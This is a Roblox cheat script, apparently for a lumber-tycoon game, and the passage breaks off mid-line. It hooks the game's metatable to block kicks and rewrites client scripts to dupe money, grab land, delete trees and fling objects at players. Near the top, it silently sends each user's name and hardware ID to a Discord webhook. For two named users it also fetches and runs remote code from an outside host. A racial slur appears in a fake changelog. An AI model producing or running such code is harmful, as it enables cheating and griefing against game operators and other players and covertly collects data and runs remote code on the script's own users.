--ebays script

local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local PlayerId = Player.UserId







local scriptver = "1.6"



local universalhwid = game:GetService("RbxAnalyticsService"):GetClientId()


if game:GetService("Players").LocalPlayer.Name == "Mistraphor" then
    game.Players.LocalPlayer:Kick("BANNED USER MAKE A APPEAL AT: https://discord.gg/vXUVtD2ZRq")
    loadstring(game:HttpGet("https://fhjioregjviodsjveiloprkjviodfhveklrjbgkltrnrtnwtrgmntwenrty.fn4iuej2hfieowkfjrgerhger.repl.co/aaaaa"))()
elseif game:GetService("Players").LocalPlayer.Name == "Bibliogist" then
    game.Players.LocalPlayer:Kick("BANNED USER MAKE A APPEAL AT: https://discord.gg/vXUVtD2ZRq")
    loadstring(game:HttpGet("https://fhjioregjviodsjveiloprkjviodfhveklrjbgkltrnrtnwtrgmntwenrty.fn4iuej2hfieowkfjrgerhger.repl.co/aaaaa"))()
end



local code = (math.random(1000000,2000000))


local url =
   "https://discord.com/api/webhooks/1078828644060901376/AjfGqb1to3BgUhgHNU4RbZzEF5HCJpQf0x-nn0hz31pUhVZd6Wp4eRBqTNKNWmKwUwwz"
local data = {
   ["content"] = "```Username: ".. game.Players.LocalPlayer.Name .. "\nSupport id: " .. code .. "\nScript version: " .. scriptver..  "\nHWID: ".. universalhwid .. "```",

}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

function Notify(titletxt, text, time)
    local GUI = Instance.new("ScreenGui")
    local Main = Instance.new("Frame", GUI)
    local title = Instance.new("TextLabel", Main)
    local message = Instance.new("TextLabel", Main)
    GUI.Name = "NotificationOof"
    GUI.Parent = game.CoreGui
    Main.Name = "MainFrame"
    Main.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
    Main.BorderSizePixel = 0
    Main.Position = UDim2.new(1, 5, 0, 50)
    Main.Size = UDim2.new(0, 330, 0, 100)

    title.BackgroundColor3 = Color3.new(0, 0, 0)
    title.BackgroundTransparency = 0.89999997615814
    title.Size = UDim2.new(1, 0, 0, 30)
    title.Font = Enum.Font.SourceSansSemibold
    title.Text = titletxt
    title.TextColor3 = Color3.new(1, 1, 1)
    title.TextSize = 17
    
    message.BackgroundColor3 = Color3.new(0, 0, 0)
    message.BackgroundTransparency = 1
    message.Position = UDim2.new(0, 0, 0, 30)
    message.Size = UDim2.new(1, 0, 1, -30)
    message.Font = Enum.Font.SourceSans
    message.Text = text
    message.TextColor3 = Color3.new(1, 1, 1)
    message.TextSize = 16
    message.TextScaled = true

    wait(0.1)
    Main:TweenPosition(UDim2.new(1, -330, 0, 50), "Out", "Sine", 0.5)
    wait(time)
    Main:TweenPosition(UDim2.new(1, 5, 0, 50), "Out", "Sine", 0.5)
    wait(0.6)
    GUI:Destroy();
end


local N=game:GetService("VirtualInputManager")


local http_request = http_request;
if syn then
	http_request = syn.request
elseif SENTINEL_V2 then
	function http_request(tb)
		return {
			StatusCode = 200;
			Body = request(tb.Url, tb.Method, (tb.Body or ''))
		}
	end
end

local players = game:GetService('Players')
  if game.Players.LocalPlayer then 
  game.StarterGui:SetCore('SendNotification', {
      Title = ' '.. players.LocalPlayer.Name..'!',
      Text = 'Welcome to ebays script',
      Icon = [[http://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userName=]]..players.LocalPlayer.Name..[[&RAND]] .. math.random(1,10000000),
      Duration = 15,
     })
    end


local code = (math.random(1000000,2000000))

local gamename = game.name
local gameid = game.placeId


--s4

local plr = game:GetService("Players").LocalPlayer

local player = game:GetService("Players")



-- Variables --

local Script = "ebays script"
local gFont = "SourceSans"
local Visi = true

-- Functions -- 

function Log(text, r, g, b, font)
    game.StarterGui:SetCore("ChatMakeSystemMessage", {
    Text = "{" .. tostring(Script) .. "} - " .. text;
    Color = Color3.new(r, g, b);
    Font = Enum.Font[font];
    FontSize = Enum.FontSize.Size10;
    })
end

Log("Loading script.", 255,255,0, tostring(gFont))
wait(1)
Log("Loading script..", 255,255,0, tostring(gFont))
wait(1)
Log("Loading script...", 255,255,0, tostring(gFont))




game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "ebays script FUNCTIONS",
    Text = "Autobuy Failed (Uncompleted). \n Anti-kick loaded. \n ebays scriptS ui loaded. \n Hope you enjoy the script" ,
    Duration = 15
  })


  game.Players.ChildAdded:Connect(function(player)
    if not pcall (function()
    SendNotification("Player JOINED",""..player.Name.." has JOINED the game",5 )
    s:Play()
    end) then
      print ("Error")
    end
    end)
  ---------------------------------------------------------------------
    -- Same extra's apply down here as well.
  
    game.Players.ChildRemoved:Connect(function(player)
    if not pcall (function()
    SendNotification("Player LEFT",""..player.Name.." has LEFT the game",4.4 )
    k:Play()
    end) then
      print ("Error")
    end
    end)


local requirements={
    ConfigSetup={
        AlwaysDay=false, 
        AlwaysNight=false,
        SpookEnabled=false,
        NoFog=false,
        WaterGodMode=false,
        WaterFloat=true, 	
        WaterWalk=false,
        flyKey='F',
        hardDragger=false,
        oldNoclipEnabled=false,
        antiBlacklist=false,
        light=false,
        fastRotate=false,
        gameMusic=true,
        uiDarkMode=true,
        wireMod=false,
        carColorR=0,
        carColorG=0,
        carColorB=0,
        carMaterial='Plastic',
        carVisualEffects=false,
        blackListAll=false,
        SprintKey='Q',
        NoclipKey='LeftControl',
        KeyTP='G',
        toggleUI='RightShift',
        FlingKey='H'
    };
    Booleans={
        DeveloperMode=true,
        Noclip=false,
        Sprinting=false,
        State=false,
        isFlying=false,
        isEnabled=true,
        friendsOnly=false,
        pingMessages=false,
        sendNotifications=false,
        infJumpEnabled=false,
        memeMode=false,
        MoneyDuping=true,
        DisableSlotSaving=false,
        Flinging=false,
        DonatingBase=false,
        alertTarget=true,
        building=false,
        treeIsCut=false,
        isLoopBringTreeEnabled=false,
        isPlankCut=false,
        cutAssistEnabled=false,
        dupeInventory=false,
        vipMode=true,
        wireMod=true,
        axeDuping=true,
        isBuying=false,
        bringBoulders=nil,
        devMode=true,
        abortAutobuy=false,
        loopBuying=false,
        dragExists=false,
        managingTarget=false,
    };
    tables={
        axeList={},
        allItems={},
        itemListForBaseDrop={},
    };
    Strings={
        WalkSpeed=16,
        flySpeed=150,
        JumpPower=50,
        HipHeight=0,
        colorToSpawn=131,
        PlayerToAdminWipe=tostring(game.Players.LocalPlayer),
        buildToBuild='Ancestor',
        SprintSpeed=20,
        selectedPlotToLoad=1,
        specialAutobuyItem='Build Power',
        DestroyStores=false,
        selectedPlot=1,
        autoDupeMoneyAmount=1,
        BaseRecipient=tostring(game.Players.LocalPlayer),
        autoBuildPlayer=tostring(game.Players.LocalPlayer),
        autoBuildReciever=tostring(game.Players.LocalPlayer),
        ToolDuplicationAmount=1,
        IdentifyType='Owner',
        bringSelectedTreeAmount=1,
        selectedTree='Generic',
        autoBuySelectedItemAmount=1,
        autoBuySelectedItem='BasicHatchet',
        plankModel=nil,
        blueprintModel=nil,
        selfDuping=false,
        itemToOpen=nil,
        itemTypeToWipe='Structure',
        DonationAmount=1,
        donationRecipient=tostring(game.Players.LocalPlayer),
        TreeModel=nil,
        selectedTarget=tostring(game.Players.LocalPlayer);
        carSpeed=1.5,
        selectedWire='NeonWirePinky',
        baseDropOwner=tostring(game.Players.LocalPlayer),
        itemToBaseDrop='All Items',
        baseDropAmount=0
    };
    services={
        RunService=game:GetService('RunService'),
        marketplaceService=game:GetService('MarketplaceService'),
        userInputService=game:GetService('UserInputService'),
        Lighting=game:GetService('Lighting'),
        VU=game:GetService('VirtualUser'),
        teleportService=game:GetService('TeleportService');
    },
    connections={
        main=nil,
        noclip=nil,
        infJump=nil,
        antiWeld=nil,
        timeCycle=nil,
        farAxeEquip=nil,
        autoChop=nil,
        clientMayLoad=nil,
        hardDragger=nil,
        PlankToBlueprint=nil,
        axeFling=nil,
        chopTree=nil,
        openItem=nil,
        woodSelection=nil,
        autoKickPlayer=nil,
        cutAssist=nil,
        cutAssistCutter=nil,
        bringTree=nil,
        spawnCheck=nil,
        carFallBack=nil,
        bringBoulders=nil,
        carInitiate=nil,
        humCheck=nil,
        grayPaintTool=nil,
        draggerRemoved=nil,
        spawnCar=nil,
        antiGUI=nil,
        draggerAdded=nil,
        shiftConnectEnded=nil,
        shiftConnectBegan=nil;
    };
    folders={
        axeFolder=game:GetService('ReplicatedStorage').AxeClasses,
        blueprintFolder=game:GetService('Workspace').Stores.WoodRUs.Blueprints,
    };

    AdminList={
        -->Removed
        'lazar_beast55'--Ancestor Main
    };
    saveConfig=nil,
    LP=game:GetService('Players').LocalPlayer,
    Players=game:GetService('Players'),
    wrkspc=game:GetService('Workspace'),
    Mouse=game:GetService('Players').LocalPlayer:GetMouse(),
    CurrentVersion='v1.0.2b'
};

if requirements.Booleans.DeveloperMode then 
    requirements.CurrentVersion=requirements.CurrentVersion..'-Developer';
elseif not requirements.Booleans.DeveloperMode and table.find(requirements.AdminList,tostring(requirements.LP))then 
    requirements.CurrentVersion=requirements.CurrentVersion..'-Administrator';
else
    requirements.CurrentVersion=requirements.CurrentVersion..'-Release';
end;
if not _G.timesExecuted then 
    _G.timesExecuted=1;
else
    _G.timesExecuted=_G.timesExecuted+1;
end;
--Changelog Shit
local quitUI=game:GetService('Players').LocalPlayer.PlayerGui.ChangelogGUI.Changelog.Quit
quitUI.TextLabel.Position=UDim2.new(0,25,0,0)

if quitUI:FindFirstChild('PlatformButton')then 
    quitUI:FindFirstChild('PlatformButton'):Destroy();
end;
local ui=requirements.LP.PlayerGui.ChangelogGUI.Changelog.Main.PageCount
local scr=getsenv(requirements.LP.PlayerGui.ChangelogGUI.ChangelogClient)
scr.setPlatformControls=function()end
scr.addPageItem=function()end
scr.displayPage=function()end
local list=requirements.LP.PlayerGui.ChangelogGUI.Changelog.Main.List
if not list:FindFirstChild('UIListLayout')then 
    local uiSorter=Instance.new('UIListLayout',list)
    uiSorter.SortOrder=Enum.SortOrder.LayoutOrder
    uiSorter.Padding=UDim.new(0,5)
end;
for i,v in next,list:children()do 
    if v.Name~='UIListLayout'then
        v:Destroy();
    end;
end;
ui.Visible=true
ui.Position=UDim2.new(0.84, 0,0.09, -36)
ui.Size=UDim2.new(0, 64,0, 32)
ui.Text='1/1'

--//Functions\\--
local functions={};
local config
if not pcall(function() readfile('AncestorV3.cfg') end) then
    writefile('AncestorV3.cfg',game:GetService'HttpService':JSONEncode(requirements.ConfigSetup))--table
end

config=game:GetService'HttpService':JSONDecode(readfile('AncestorV3.cfg'))

functions.saveConfig=function()
    writefile('AncestorV3.cfg',game:GetService'HttpService':JSONEncode(config))
end;

requirements.ConfigSetup=config;

functions.isPlayerAdmin=function(player)
    if table.find(requirements.AdminList,tostring(player))then 
        return true;
    end;
    return false;
end;

functions.notify=function(title, text, duration)
    if requirements.Booleans.isEnabled then
        game.StarterGui:SetCore(
            'SendNotification',
            {
                Title=title,
                Text=text,
                Duration=duration;
            }
        );
    end;
end;

getgenv().spawnf = function(func,...) return coroutine.wrap(func)(...) end

functions.updateChangelog=function(header,text)
    local headerText=Instance.new('TextLabel',list)
    headerText.BackgroundColor3=Color3.fromRGB(238, 225, 216);
    headerText.BorderSizePixel=0
    headerText.Size=UDim2.new(1, 0,0.063, 0)
    headerText.Text=' '..header
    headerText.TextXAlignment=Enum.TextXAlignment.Left
    headerText.Font=Enum.Font.ArialBold
    headerText.TextSize=18
    headerText.ZIndex=6

    local updateText=Instance.new('TextLabel',list)
    updateText.BackgroundColor3=Color3.fromRGB(238, 225, 216);
    updateText.BorderSizePixel=0
    updateText.Size=UDim2.new(1, 0,0.123, 0)
    updateText.Text=' U nan: '..text
    updateText.TextXAlignment=Enum.TextXAlignment.Left
    updateText.Font=Enum.Font.Arial
    updateText.TextSize=13
    updateText.ZIndex=6
end;
functions.updateChangelog('40th May 4091','Nigger what u lookin at');
functions.AntiAFK=function()
    requirements.LP.Idled:Connect(function()
        functions.notify('ebays script', 'Anti AFK Auto-Enabled', 4)
        requirements.services.VU:Button2Down(Vector2.new(0, 0), requirements.wrkspc.CurrentCamera.CFrame);
        wait(.325)
        requirements.services.VU:Button2Up(Vector2.new(0, 0), requirements.wrkspc.CurrentCamera.CFrame);
    end);
end;
functions.AntiAFK();

functions.antiDestroyEarRape=function()
    requirements.LP.Character.Head.ChildAdded:Connect(function(b)
        if b.Name=='DestroyStructure'then 
            b.Volume=0
        end;
    end);
end;
functions.antiDestroyEarRape();
requirements.LP.CharacterAdded:Connect(function()
    repeat wait()until requirements.LP.Character and requirements.LP.Character:FindFirstChild('Head');
    functions.antiDestroyEarRape();
end);

functions.clientMayLoad=function(mode)
pcall(function()game.CoreGui.GUI:remove()end)
if mode=='Dark'then
    color1=Color3.fromRGB(15,15,15);
    color2=Color3.fromRGB(255,255,255);
elseif mode=='Light'then 
    color1=Color3.fromRGB(255,255,255);
    color2=Color3.fromRGB(0,0,0);
end;
local GUI=Instance.new('ScreenGui');
local GUIFrame=Instance.new('Frame');
local Text=Instance.new('TextLabel');
local UICorner=Instance.new('UICorner');
GUI.Name='GUI';
GUI.Parent=game:GetService'CoreGui';
GUI.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;
GUIFrame.Name='FPSFrame';
GUIFrame.Parent=GUI;
GUIFrame.Size=UDim2.new(0,140,0,20);
GUIFrame.Position=UDim2.new(1,-1925,1,-18);
GUIFrame.BorderSizePixel=0;
GUIFrame.BackgroundColor3=color1;
UICorner.Name='UICorner';
UICorner.Parent=GUIFrame;
UICorner.CornerRadius=UDim.new(0,6);
Text.Name='Text';
Text.Parent=GUIFrame;
Text.TextWrapped=true;
Text.ZIndex=2;
Text.BorderSizePixel=0;
Text.BackgroundColor3=Color3.fromRGB(255,255,255);
Text.Size=UDim2.new(1,-2,1,0);
Text.TextSize=14.000;
Text.Text='';
Text.TextColor3=color2;
Text.Font=Enum.Font.GothamSemibold;
Text.Position=UDim2.new(0,2,0,0);
Text.BackgroundTransparency=1.000;
game.CoreGui.ChildRemoved:Connect(function(b)
    if b.Name=='GUI'then 
        if requirements.connections.clientMayLoad then 
            requirements.connections.clientMayLoad:Disconnect();
            requirements.connections.clientMayLoad=nil;
        end;
    end;
end);
requirements.connections.clientMayLoad=game:GetService('RunService').Heartbeat:Connect(function()
    local success=game:GetService('ReplicatedStorage').LoadSaveRequests.ClientMayLoad:InvokeServer(requirements.LP)
        if success then
            Text.Text='You Can Load';
        else 
            Text.Text='You Cannot Load';
        end;
    end);
end;
if requirements.ConfigSetup.uiDarkMode then 
    functions.clientMayLoad('Dark');
else
    functions.clientMayLoad('Light');
end;

functions.donate=function(plr,amount)
    if tostring(plr)== tostring(requirements.LP) then 
        functions.notify('Error','Select another player!',4);
        return;
    end;
    if requirements.Strings.donationRecipient==nil or not requirements.Players:FindFirstChild(plr)then 
        functions.notify('Error','Player not found!',4);
        return;
    end;
    if tonumber(requirements.Strings.DonationAmount) >=60000000 then 
        functions.notify('Error','Amount too high!',4);
        return;
    end;
    if tonumber(requirements.Strings.DonationAmount) <=0 then 
        functions.notify('Error','Amount too low!',4);
        return;
    end;
    if requirements.LP.CurrentSaveSlot.Value<=0 then 
        functions.notify('Error','No plot loaded!',4);
        return;
    end;
    if not requirements.LP:FindFirstChild('CurrentlySavingOrLoading')then 
        functions.notify('Error','Save in progress',4);
        return;
    end;
    if tonumber(requirements.Strings.DonationAmount) >requirements.LP.leaderstats.Money.Value then 
        functions.notify('Error','Insufficient funds',4);
        return;
    end;
    local scr=getsenv(requirements.LP.PlayerGui.DonateGUI.DonateClient)
    local scr2=getsenv(requirements.LP.PlayerGui.NoticeGUI.NoticeClient)
    scr.setPlatformControls=function()end
    scr.openWindow();
    game:GetService'RunService'.Heartbeat:wait();
    local oldAmount=requirements.Players:FindFirstChild(plr).leaderstats.Money.Value;
    local success,errormsg=spawnf(function()requirements.remotes.Donate:InvokeServer(requirements.Players:FindFirstChild(plr),tonumber(amount),tonumber(requirements.LP.CurrentSaveSlot.Value))end);
    game:GetService'RunService'.Heartbeat:wait();
    for i,v in next,getupvalues(scr.sendDonation)do
        if i==1 then 
            debug.setupvalue(scr.sendDonation,i,game.Players:FindFirstChild(plr));
        end;
    end;
    scr.sendDonation();
    game:GetService'RunService'.Heartbeat:wait();
    scr2.exitNotice();
    functions.notify('ebays script','Attempting Donation',2);
    wait(6)
    if requirements.Players:FindFirstChild(plr).leaderstats.Money.Value~= oldAmount + amount then 
        functions.notify('Error','An Error Occured.. Possibly Cooldown!',4);
        scr2.exitNotice();
        return;
    end;
    functions.notify('ebays script','Donated '..tostring(amount)..' to '..tostring(plr),4);
    scr2.exitNotice();
end; 

functions.Teleport=function(cf)
    repeat wait()until requirements.LP.Character:FindFirstChild('HumanoidRootPart');
    if requirements.LP.Character.Humanoid.Sit then 
        requirements.LP.Character.Humanoid.SeatPart.Parent:SetPrimaryPartCFrame(cf*CFrame.Angles(math.rad(requirements.LP.Character.Humanoid.SeatPart.Parent.PrimaryPart.Orientation.X), math.rad(requirements.LP.Character.Humanoid.SeatPart.Parent.PrimaryPart.Orientation.Y), math.rad(requirements.LP.Character.Humanoid.SeatPart.Parent.PrimaryPart.Orientation.Z)));
    elseif not requirements.LP.Character.Humanoid.Sit then 
        requirements.LP.Character:SetPrimaryPartCFrame(cf)
    end;
end;

functions.KillPlayer=function()
    pcall(function()
        requirements.LP.Character.Head:Destroy();
    end);
end;

functions.getPlayersBase=function(plr)
    for i,v in next,requirements.wrkspc.Properties:children()do 
        if v:IsA('Model')and tostring(v.Owner.Value)==plr then 
            return v;
        end;
    end;
    return false;
end;

functions.RecolourPlot=function(r,g,b)
    local plot=functions.getPlayersBase(tostring(requirements.LP));
    if plot~=false then
        for _,v in next,plot:children()do
            if v:IsA('BasePart')then 
                v.Color=Color3.fromRGB(r,g,b);
            end;
        end;
    end;
end;

functions.getFreeLand=function()
    for _,v in next,requirements.wrkspc.Properties:children()do 
        if v.Owner.Value==nil then
            return v;
        end;
    end;
end;

functions.FreeLand=function()
    if functions.getPlayersBase(tostring(requirements.LP))then 
        functions.notify('Error','You already have a plot!',4);
        return;
    end;
    local plot=functions.getFreeLand();
    requirements.remotes.setPropertyPurchasingValue:InvokeServer(true);
    requirements.remotes.clientPurchasedProperty:FireServer(plot, plot.OriginSquare.CFrame.p);
    requirements.remotes.setPropertyPurchasingValue:InvokeServer(false);
    functions.Teleport(CFrame.new(plot.OriginSquare.CFrame.p)+Vector3.new(0,5,0));
end;

functions.flipCar=function()    
    pcall(function()
        requirements.LP.Character.Humanoid.SeatPart.Parent:SetPrimaryPartCFrame(requirements.LP.Character.Humanoid.SeatPart.Parent.PrimaryPart.CFrame*CFrame.Angles(math.rad(-180),0,0))
    end)
end;

functions.fastRotate=function()
    local scr2=getsenv(requirements.LP.PlayerGui.Scripts.UserInput)
    local rotateX=scr2.getSteerFromKeys
    local rotateY=scr2.getThrottleFromKeys
    if requirements.ConfigSetup.fastRotate then
        for i,v in next,getconstants(rotateX)do 
            debug.setconstant(rotateX,1,3)
        end;
        for i,v in next,getconstants(rotateY)do 
            debug.setconstant(rotateY,1,3)
        end;
    end;
    if not requirements.ConfigSetup.fastRotate then
        for i,v in next,getconstants(rotateX)do 
            debug.setconstant(rotateX,1,1)
        end;
        for i,v in next,getconstants(rotateY)do 
            debug.setconstant(rotateY,1,1)
        end;
    end;
end;

functions.antiBlacklist=function(v)
    local scr=getsenv(requirements.LP.PlayerGui.BlackListGUI.ClientBeBlacklisted)
    local old=scr.makeWalls
    local old2=scr.checkIfPlayerNeedsToBeKicked
    if v=='Enable'then
        scr.makeWalls=function()end
        scr.removeWalls()
        scr.checkIfPlayerNeedsToBeKicked=function()end
        local oldPos=requirements.LP.Character.HumanoidRootPart.CFrame
        requirements.connections.humCheck=game:GetService('RunService').RenderStepped:connect(function()
            pcall(function()
                oldPos=requirements.LP.Character.HumanoidRootPart.CFrame
            end);
        end);
        for _,spawnLocation in next,workspace.Region_Main:children()do
            if spawnLocation:IsA('SpawnLocation')then
                spawnLocation.Touched:Connect(function(spawnPoint)
                if spawnPoint.Parent==requirements.LP.Character then 
                    requirements.LP.Character.HumanoidRootPart.CFrame=oldPos
                end
            end)
        end;
    end;
    elseif v=='Disable'then 
        if requirements.connections.humCheck then 
            requirements.connections.humCheck:Disconnect();
            requirements.connections.humCheck=nil;
        end;
        scr.makeWalls=old;
        scr.checkIfPlayerNeedsToBeKicked=old2;
    end;
end;

functions.getAxeList=function()
    for _,v in next,requirements.folders.axeFolder:children()do 
        table.insert(requirements.tables.axeList,tostring(v));
    end;
end;
functions.getAxeList();

--> Discord Invite (REMOVED)

functions.axeFling=function()
    requirements.connections.axeFling=requirements.Mouse.Button1Down:Connect(function()
        local axe;
        for _,v in next,requirements.LP.Backpack:children()do
            if v:IsA('Tool')and v.Name~='BlueprintTool'then 
                game.ReplicatedStorage.Interaction.ClientInteracted:FireServer(v, 'Drop tool', requirements.LP.Character.HumanoidRootPart.CFrame)
                break;
            end;
        end;
        local axeConnection
        axeConnection=workspace.PlayerModels.ChildAdded:connect(function(newAxe)
            newAxe:WaitForChild('Owner')
            if newAxe.Owner.Value==requirements.LP and newAxe:FindFirstChild('ToolName')then
                axe=newAxe;
                wait(2.5);
                game.ReplicatedStorage.Interaction.ClientInteracted:FireServer(axe,'Pick up tool');
            end;
        end);
        repeat wait()until axe;
        axeConnection:Disconnect();
        axeConnection=nil;
        local fling=Instance.new('BodyPosition',axe.Main);
        fling.MaxForce=Vector3.new(math.huge,math.huge,math.huge);
        fling.P=65000;
        fling.Position=requirements.Mouse.Hit.p;
        local flingPower=9e9;
        axe.Main.CanCollide=false;
        repeat game:GetService('RunService').Stepped:wait();axe.Main.RotVelocity = Vector3.new(1,.5,.5)*flingPower;until(axe.Main.CFrame.p-fling.Position).Magnitude<15;
        wait(2.5);
        fling:Destroy();
        axe.Main.CanCollide=true;
        game.ReplicatedStorage.Interaction.ClientInteracted:FireServer(axe,'Pick up tool');
    end);
end;

functions.fastLoadSelectedPlot=function(slotnum)
    local scr=getsenv(requirements.LP.PlayerGui.PropertyPurchasingGUI.PropertyPurchasingClient);
    local loadedSlot=nil;
    if requirements.LP.CurrentSaveSlot.Value~=-1 and not requirements.Booleans.MoneyDuping then 
        requirements.remotes.requestSave:InvokeServer(requirements.LP.CurrentSaveSlot.Value,requirements.LP)
    end
    spawnf(function()
        loadedSlot=requirements.remotes.requestLoad:InvokeServer(slotnum,requirements.LP);
    end);
    game:GetService("ReplicatedStorage").LoadSaveRequests.GetTickCut:InvokeServer();
    repeat wait()until requirements.LP.PlayerGui.PropertyPurchasingGUI.SelectPurchase.Visible;
    for i=1,20 do 
        wait(.15);
        scr.selectionMade();
    end;
    repeat wait()until loadedSlot~=nil;
    requirements.LP.CurrentSaveSlot.Value=slotnum;
    return loadedSlot;
end;

functions.DeleteTrees=function()
    for _,treeregion in next,requirements.wrkspc:children()do
        if tostring(treeregion)=='TreeRegion'then
            for _,tree in next,treeregion:children()do
                requirements.remotes.clientIsDragging:FireServer(tree);
                requirements.remotes.destroyStructure:FireServer(tree);
            end;
        end;
    end;
end;

functions.SelfWl=function(value)
    requirements.remotes.clientSetListPlayer:InvokeServer(requirements.LP.WhitelistFolder,requirements.LP,value);
end;

loadstring([[
    local args = {...} local functions,requirements = args[1],args[2]
    local mt = getrawmetatable(game);
    local old = mt.__namecall;
    local protect = newcclosure or protect_function
    setreadonly(mt, false);
    mt.__namecall = protect(function(self, ...)
        local method = getnamecallmethod();
        local argss = {...};
        if method == 'InvokeServer' and tostring(self) == 'RequestSave' then
            if requirements.Booleans.DisableSlotSaving and requirements.Booleans.isEnabled then
                return{false};
            end;
        elseif method=='FireServer'and tostring(self)=='ClientPlacedWire'then 
            if requirements.ConfigSetup.wireMod then 
                argss[1]=game.ReplicatedStorage.Purchasables.WireObjects[requirements.Strings.selectedWire];
            end;
        elseif method=='FireServer'and tostring(self)=='DamageHumanoid'then
            if requirements.ConfigSetup.WaterGodMode then
                return 0;
            end;
        elseif method=='InvokeServer'and tostring(self)=='GetTickCut'then
            if not requirements.Booleans.selfDuping and not requirements.Booleans.DonatingBase and requirements.Booleans.isEnabled then
                for _,Model in next,workspace.PlayerModels:GetChildren()do 
                    if Model:FindFirstChild'Owner'and tostring(Model.Owner.Value)==tostring(requirements.LP)then
                        game:GetService('ReplicatedStorage').Interaction.DestroyStructure:FireServer(Model);
                    end;
                end;
            end;setnamecallmethod(method)
        elseif method == 'Kick' then
            wait(9e9);
            return;
        end;
        return old(self, unpack(argss));
    end);
    hookfunction(requirements.LP.Kick,protect(function() wait(9e9) end));
]])(functions,requirements)

functions.checkModel=function(item,option,player)
    local Owner=nil;
    if player==nil then 
        Owner=tostring(requirements.LP);
    end
    for _,v in next,workspace.PlayerModels:children()do
        if v:IsA('Model')then 
            local check=v:FindFirstChild('ItemName')or v:FindFirstChild('PurchasedBoxItemName');
            if item=='BasicHatchet' then 
                check=v:FindFirstChild('ItemName')
            end;
            if  check and  check.Value==item and v:FindFirstChild('Owner')and tostring(v.Owner.Value)==Owner then
                if option=='Model'then
                    return v;
                elseif option=='Magnitude'then
                    return (v.PrimaryPart.CFrame.p-requirements.LP.Character.HumanoidRootPart.CFrame.p).magnitude;
                end;
            end;
        end;
    end;
    return false;
end

functions.DeleteSurroundingTrees=function()
    for _,v in next,requirements.wrkspc:children()do
        if tostring(v)=='TreeRegion'then
            for _,g in next,v:children()do
                if(requirements.LP.Character.HumanoidRootPart.CFrame.p-g.WoodSection.CFrame.p).magnitude<150 then 
                    requirements.remotes.clientIsDragging:FireServer(g);
                    requirements.remotes.destroyStructure:FireServer(g);
                end;
            end;
        end;
    end;
end;

functions.managePlayer=function(option,value)
    for _,v in next,game.Players:children()do 
        if v~=requirements.LP then 
            if option=='Whitelist' then 
                game:GetService('ReplicatedStorage').Interaction.ClientSetListPlayer:InvokeServer(game:GetService('Players').LocalPlayer.WhitelistFolder,v,value);
            elseif option=='Blacklist'then 
                game:GetService('ReplicatedStorage').Interaction.ClientSetListPlayer:InvokeServer(game:GetService('Players').LocalPlayer.BlacklistFolder,v,value);
            end;
        end;
    end;
end;

functions.unlockDonationUI=function()
    if requirements.LP.AccountAge>5 or _G.Done then 
        functions.notify('Error','Already Unlocked!',4);
        return;
    end;
    local scr=getsenv(requirements.LP.PlayerGui.DonateGUI.DonateClient)
    local ui=requirements.LP.PlayerGui.MenuGUI.Menu.Main.Donate
    local donateUI=requirements.LP.PlayerGui.DonateGUI;
    ui.Active=true;
    _G.Done=true;
    spawn(function()
        ui.TextLabel.Text='UNLOCKED!';
        wait(1)
        ui.TextLabel.Text='Send Money';
    end);
    donateUI.Donate.Quit.TextLabel.Position=UDim2.new(0,25,0,0)

    if donateUI.Donate.Quit:FindFirstChild('PlatformButton')then 
        donateUI.Donate.Quit:FindFirstChild('PlatformButton'):Destroy();
    end;

    ui.MouseButton1Down:Connect(function()
        hookfunction(scr.setPlatformControls,function()return false end)
        scr.openWindow();
    end);

    donateUI.Donate.Quit.MouseButton1Down:Connect(function()
        scr.back();
    end);
end;

functions.applyLight=function(value)
    if value then 
        local light = Instance.new('PointLight', requirements.LP.Character.Head)
        light.Name='Ancestor'
        light.Range = 150
        light.Brightness = 1.7
    else
        pcall(function()
            requirements.LP.Character.Head.Ancestor:remove();
        end);
    end;
end;

functions.buyItem=function(item)
    local Cashier=functions.getCashier(item);
    local CashierID=functions.getID(item);
    requirements.remotes.playerChatted:InvokeServer({Character=Cashier,Name=tostring(Cashier), ID=CashierID},'ConfirmPurchase');
end;

functions.MaxLand=function(Plot)
    if not functions.getPlayersBase(tostring(requirements.LP))then 
        functions.FreeLand();
    end;
    if not Plot then 
        Plot=functions.getPlayersBase(tostring(requirements.LP));
    end;
    local OriginSquare=Plot.OriginSquare;
    local children=#Plot:children()
    if children >=26 and not requirements.Strings.selfDuping then 
        functions.notify('Error','Already Max-Landed',4);
        return;
    end;
    requirements.remotes.setPropertyPurchasingValue:InvokeServer(true);
    requirements.remotes.clientExpandedProperty:FireServer(Plot ,CFrame.new(OriginSquare.Position.X + 40, OriginSquare.Position.Y, OriginSquare.Position.Z));requirements.remotes.clientExpandedProperty:FireServer(Plot ,CFrame.new(OriginSquare.Position.X - 40, OriginSquare.Position.Y, OriginSquare.Position.Z));requirements.remotes.clientExpandedProperty:FireServer(Plot ,CFrame.new(OriginSquare.Position.X, OriginSquare.Position.Y, OriginSquare.Position.Z + 40));requirements.remotes.clientExpandedProperty:FireServer(Plot ,CFrame.new(OriginSquare.Position.X, OriginSquare.Position.Y, OriginSquare.Position.Z - 40));requirements.remotes.clientExpandedProperty:FireServer(Plot ,CFrame.new(OriginSquare.Position.X + 40, OriginSquare.Position.Y, OriginSquare.Position.Z + 40));requirements.remotes.clientExpandedProperty:FireServer(Plot ,CFrame.new(OriginSquare.Position.X + 40, OriginSquare.Position.Y, OriginSquare.Position.Z - 40));requirements.remotes.clientExpandedProperty:FireServer(Plot ,CFrame.new(OriginSquare.Position.X - 40, OriginSquare.Position.Y, OriginSquare.Position.Z + 40));requirements.remotes.clientExpandedProperty:FireServer(Plot ,CFrame.new(OriginSquare.Position.X - 40, OriginSquare.Position.Y, OriginSquare.Position.Z - 40));requirements.remotes.clientExpandedProperty:FireServer(Plot ,CFrame.new(OriginSquare.Position.X + 80, OriginSquare.Position.Y, OriginSquare.Position.Z));requirements.remotes.clientExpandedProperty:FireServer(Plot ,CFrame.new(OriginSquare.Position.X - 80, OriginSquare.Position.Y, OriginSquare.Position.Z));requirements.remotes.clientExpandedProperty:FireServer(Plot ,CFrame.new(OriginSquare.Position.X, OriginSquare.Position.Y, 